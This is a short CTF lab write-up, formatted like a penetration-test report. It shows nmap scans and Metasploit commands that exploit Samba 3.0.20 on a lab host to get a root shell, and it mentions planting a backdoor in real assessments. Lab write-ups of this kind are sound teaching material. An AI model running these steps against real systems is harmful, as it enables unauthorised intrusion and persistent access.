## Initial Access - Vulnerable SMB version + Metasploit

**Vulnerability Explanation:** A vulnerable version of SMB (Samba 3.0.20) is running on the target machine. A publicly available exploit is available and can be used to gain access to the machine.

**Vulnerability Fix:** Upgrade the vulnerable SMB server to a non-vulnerable patch.

**Severity:** Critical

**Steps to reproduce the attack:** Christian perform port enumeration and service enumeration and found port 445 was running Samba 3.0.20. He was able to use an exploit on Metasploit to gain initial access.

**Port Scan Results**

**TCP:** 21, 22, 139, 445, 3632

**UDP:** N/A

Use nmap to scan the target for open ports.

TCP ports 21, 22, 139, 445, 3632 were discovered.

```shell
nmap -p- -T5 -vvv -oN nmap.initial 10.10.10.3
```

Further enumerating the open ports reveals the version of SMB running on the machine. Samba 3.0.20

```shell
nmap -v -A -p21,22,139,445,3632 -oN nmap.service 10.10.10.3
```

Use Metasearch for the exploit and use it.

```shell
sudo msfconsole
```

```
search samba 3.0.20
```

```
use 0
```

Configure the exploit then run it to get a shell on the target.

```
set RHOSTS 10.10.10.3
```

```
set LHOST 10.10.16.10
```

```
run
```

We have successfully got initial access to the machine as ‘root’.

‘root’ is a high privileged user so privilege escalation is not needed.


## Privilege Escalation - N/A

**Vulnerability Explanation:** N/A

**Vulnerability Fix:** N/A

**Severity:** N/A

**Steps to reproduce the attack:** N/A

## Post Exploitation

Since this is a CTF the objective is only to retreive the flag located in the /root directory as a privileged user. 

In a real world assessment, we would attempt to add a back door for continuous access to the machine.
